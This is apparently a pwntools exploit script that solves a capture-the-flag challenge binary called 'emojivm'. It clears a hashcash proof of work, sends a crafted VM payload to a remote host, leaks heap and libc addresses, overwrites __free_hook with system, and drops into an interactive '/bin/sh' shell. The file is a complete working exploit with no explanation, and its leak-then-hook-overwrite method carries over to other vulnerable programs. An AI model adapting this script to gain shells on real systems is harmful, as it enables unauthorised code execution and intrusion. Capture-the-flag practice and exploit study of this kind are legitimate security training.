from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./emojivm"
context.terminal = ["tmux", "splitw", "-h"]

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
  r.recvuntil ("-mb25 ")
  hash_seed = r.recvline ()[:-1]
  print "hash_seed:" + hash_seed
  hash_args = ["hashcash", "-mb25", hash_seed]
  pp = process (hash_args)
  pp.recvuntil ("hashcash token: ")
  r.sendlineafter ("hashcash token: ", pp.recvline ()[:-1])
  r.recvuntil ("1000 bytes")

  with open ("payload.evm", "rb") as f:
    pay = f.read ()

  r.sendline (str(len(pay)))
  r.sendafter ("file:\n", pay)
except:
  r = process ([bin_name, "./payload.evm"])#gdb.debug([bin_name, "./payload.evm"], aslr=False, gdbscript=cmd) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name)
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

#context.log_level = 'debug'

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

heap_leak = int(r.recvn (14))
print "heap_leak: " + hex(heap_leak)
r.sendline ("/bin/sh")

libc_leak_target = heap_leak + 0x670

r.sendline (p64(8) + p64 (libc_leak_target))

libc_leak = u64(r.recvn(6) + "\x00\x00")
libc_base = libc_leak - 0x3ebca0
print "libc_base: " + hex(libc_base)

system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]

r.sendline (p64(8) + p64(free_hook))
r.sendline (p64(system))

r.interactive ()
